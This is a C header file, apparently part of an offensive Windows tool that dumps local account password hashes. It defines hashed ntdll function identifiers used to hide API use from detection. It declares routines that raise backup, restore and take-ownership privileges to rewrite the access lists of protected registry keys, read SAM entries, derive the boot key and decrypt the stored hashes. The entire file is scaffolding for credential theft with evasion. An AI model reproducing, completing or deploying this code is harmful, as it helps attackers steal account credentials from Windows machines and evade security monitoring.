#pragma once

#include <winternl.h>

#include "ntdll.h"

// https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-element-size-limits
#define MAX_KEY_LENGTH 255+2
#define MAX_KEY_VALUE_LENGTH 1000
#define MAX_VALUE_NAME 16383+2
#define MAX_SAM_ENTRIES 100
#define MAX_SECURITY_LENGTH 1024
#define STR_TO_KEY_LEN 8

#define NtOpenKey_RFDT   0xB9491C52
#define NtQueryKey_RFDT          0x3C34AAD6
#define NtEnumerateKey_RFDT      0x8E67DF26
#define NtQueryValueKey_RFDT     0x59F4E4D3
#define NtEnumerateValueKey_RFDT         0x0AE54B23
#define NtClose_RFDT     0x67741D8D
#define TpAllocWork_RFDT         0x4F054787
#define TpPostWork_RFDT          0xE91D6BE2
#define TpReleaseWork_RFDT       0x50595ADD
#define RtlInitUnicodeString_RFDT        0xB1AFABD9
#define ntdlldll_RFDT    0x8C6C8F3D
#define NtOpenKeyEx_RFDT         0x3001822F
#define RtlAdjustPrivilege_RFDT          0xDEBA8E59
#define NtQuerySecurityObject_RFDT       0x96E803DC
#define NtSetSecurityObject_RFDT         0xF62EC132
#define RtlCreateSecurityDescriptor_RFDT         0xF825CFF2
#define RtlSetDaclSecurityDescriptor_RFDT        0xDEDBA61E
#define RtlSetOwnerSecurityDescriptor_RFDT       0xBBFE56F5
#define RtlCreateAcl_RFDT        0x6E33604B
#define RtlAddAccessAllowedAceEx_RFDT    0xFABD6950

// Privileges required to rewrite the DACL of protected registry keys without SYSTEM rights
#define SE_TAKE_OWNERSHIP_PRIVILEGE      9
#define SE_RESTORE_PRIVILEGE     18
#define SE_BACKUP_PRIVILEGE      17

typedef FARPROC(WINAPI* myMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT);

typedef NTSTATUS(WINAPI* myNtOpenKey)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS(WINAPI* myNtQueryKey)(HANDLE, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* myNtEnumerateKey)(HANDLE, ULONG, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* myNtQueryValueKey)(HANDLE, PUNICODE_STRING, KEY_VALUE_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* myNtEnumerateValueKey)(HANDLE, ULONG, KEY_VALUE_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(WINAPI* myNtClose)(HANDLE);

typedef VOID(WINAPI* myRtlInitUnicodeString)(PUNICODE_STRING, __drv_aliasesMem PCWSTR);

typedef NTSTATUS(WINAPI* myNtOpenKeyEx)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG);
typedef NTSTATUS(WINAPI* myRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(WINAPI* myNtQuerySecurityObject)(HANDLE, SECURITY_INFORMATION, PSECURITY_DESCRIPTOR, ULONG, PULONG);
typedef NTSTATUS(WINAPI* myRtlSetOwnerSecurityDescriptor)(PSECURITY_DESCRIPTOR, PSID, BOOLEAN);
typedef NTSTATUS(WINAPI* myRtlCreateAcl)(PACL, ULONG, ULONG);
typedef NTSTATUS(WINAPI* myRtlAddAccessAllowedAceEx)(PACL, ULONG, ULONG, ACCESS_MASK, PSID);

typedef NTSTATUS(WINAPI* myNtSetSecurityObject)(HANDLE, SECURITY_INFORMATION, PSECURITY_DESCRIPTOR);
typedef NTSTATUS(WINAPI* myRtlCreateSecurityDescriptor)(PSECURITY_DESCRIPTOR, ULONG);
typedef NTSTATUS(WINAPI* myRtlSetDaclSecurityDescriptor)(PSECURITY_DESCRIPTOR, BOOLEAN, PACL, BOOLEAN);


typedef struct _sam {
	WCHAR rid[MAX_KEY_LENGTH];
	BYTE v[MAX_KEY_VALUE_LENGTH];
	ULONG vLen;
	BYTE f[MAX_KEY_VALUE_LENGTH];
	ULONG fLen;
	WCHAR classes[MAX_KEY_VALUE_LENGTH];
} *PSAM, SAM;

// Self-relative security descriptor header used to locate the saved original DACL when merging the new ACE into it
typedef struct _relDescriptor {
	UCHAR Revision;
	UCHAR Sbz1;
	USHORT Control;
	ULONG Owner;
	ULONG Group;
	ULONG Sacl;
	ULONG Dacl;
} *PRELDESCRIPTOR, RELDESCRIPTOR;

typedef struct _daclSave {
	WCHAR regPath[MAX_KEY_LENGTH];                  // \Registry\Machine\... native path of the rewritten key
	ULONG sdLength;                                 // length of the saved self-relative security descriptor
	ULONG sd[MAX_SECURITY_LENGTH / sizeof(ULONG)];  // saved original owner + DACL
	struct _daclSave* next;                         // next node in the chained list of saved descriptors
} *PDACLSAVE, DACLSAVE;

extern BOOL gDebugEnabled;

FARPROC myGetProcAddress(DWORD moduleName, DWORD exportName);
void DebugPrintf(const CHAR* format, ...);
void DebugWPrintf(const WCHAR* format, ...);
void DebugPrintHex(const CHAR* label, const BYTE* data, ULONG length);
void DebugPrintHexPreview(const CHAR* label, const BYTE* data, ULONG length, ULONG maxLength);
void DebugPrintWideString(const CHAR* label, const WCHAR* value);
void DebugPrintWideLength(const CHAR* label, const WCHAR* value, ULONG charLength);
void DebugPrintGuid(const CHAR* label, REFGUID guid);
void getSAM(PSAM samRegEntries[], PULONG size);
void getClasses(PSAM samRegEntry);
PDACLSAVE grantRegistryAccess();
void restoreRegistryAccess(PDACLSAVE saves);
void getBootKey(PSAM samRegEntry, PBYTE bootKeyRet);
void strToKey(PBYTE s, PBYTE keyRet);
void decryptSAM(PSAM samRegEntries[], int entries);
void getDESStr1(PSAM samRegEntry, PBYTE desStr1Ret);
void getDESStr2(PSAM samRegEntry, PBYTE desStr2Ret);
void getAuxSyskey(PSAM samRegEntry, PBYTE auxSyskeyRet);
void toUpperStr(char* s);
DWORD HashString2A(LPCSTR String);
